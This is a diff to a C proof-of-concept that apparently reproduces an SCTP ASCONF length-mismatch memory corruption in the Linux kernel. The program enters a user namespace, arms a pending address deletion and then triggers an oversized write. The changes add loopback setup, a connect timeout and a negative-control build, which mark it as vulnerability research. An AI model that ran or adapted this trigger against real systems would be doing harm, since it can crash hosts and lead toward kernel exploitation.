@@ -105,6 +105,18 @@ static void setup_net(void)
 	sysctl_set("/proc/sys/net/ipv6/conf/all/disable_ipv6", "0");
 
 	nl = nl_open();
+
+	/* A fresh netns has lo DOWN. Delivery to a local address -- even one
+	 * assigned to another interface -- is routed through lo, so without
+	 * this every connect() to our own address blackholes and hangs. */
+	{
+		int lo = if_index("lo");
+		if (lo > 0 && link_up(nl, lo) != 0)
+			logf("WARN: link_up(lo) failed");
+		else
+			logf("lo up (ifindex=%d)", lo);
+	}
+
 	ifi = create_dummy(nl, "d0");
 	if (ifi < 0)
 		die("create dummy d0");
@@ -171,13 +183,22 @@ static void attempt(int iter, int n_add)
 		goto out;
 	}
 
-	/* Step 3: association to a GLOBAL-scope peer -> v4 filtered out. */
-	if (connect(c, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+	/* Step 3: association to a GLOBAL-scope peer -> v4 filtered out.
+	 * Bounded by an alarm so one unreachable peer cannot stall the sweep. */
+	alarm(6);
+	rc = connect(c, (struct sockaddr *)&srv, sizeof(srv));
+	alarm(0);
+	if (rc < 0) {
 		logf("iter%d connect failed: %s", iter, strerror(errno));
 		goto out;
 	}
 
-	/* Step 4: arm asconf_addr_del_pending with the v6 (20-byte addr param). */
+	/* Step 4: arm asconf_addr_del_pending with the v6 (20-byte addr param).
+	 *
+	 * SKIP_ARM builds the negative control: identical in every other way,
+	 * so if the control runs clean the crash is attributable to the
+	 * del-pickup mismatch and not merely to adding N addresses. */
+#ifndef SKIP_ARM
 	rc = setsockopt(c, SOL_SCTP, SCTP_SOCKOPT_BINDX_REM, &cli, sizeof(cli));
 	if (rc < 0) {
 		logf("iter%d ARM bindx_rem failed: %s  <-- del_pending NOT set",
@@ -185,6 +206,9 @@ static void attempt(int iter, int n_add)
 		goto out;
 	}
 	logf("iter%d ARMED (del_pending = v6)", iter);
+#else
+	logf("iter%d CONTROL: arming step skipped", iter);
+#endif
 
 	/* Step 5: trigger. n_add v4 params (8B each) + del pickup reserved 8B
 	 * but written as 20B. */
@@ -203,9 +227,16 @@ out:
 	if (s >= 0) close(s);
 }
 
+static void on_alarm(int sig) { (void)sig; }   /* interrupt, do not die */
+
 int main(void)
 {
 	int n;
+	struct sigaction sa_alrm;
+
+	memset(&sa_alrm, 0, sizeof(sa_alrm));
+	sa_alrm.sa_handler = on_alarm;         /* no SA_RESTART: must interrupt */
+	sigaction(SIGALRM, &sa_alrm, NULL);
 
 	logf("=== SCTP ASCONF del-pickup length mismatch (C3) ===");
 	enter_userns();
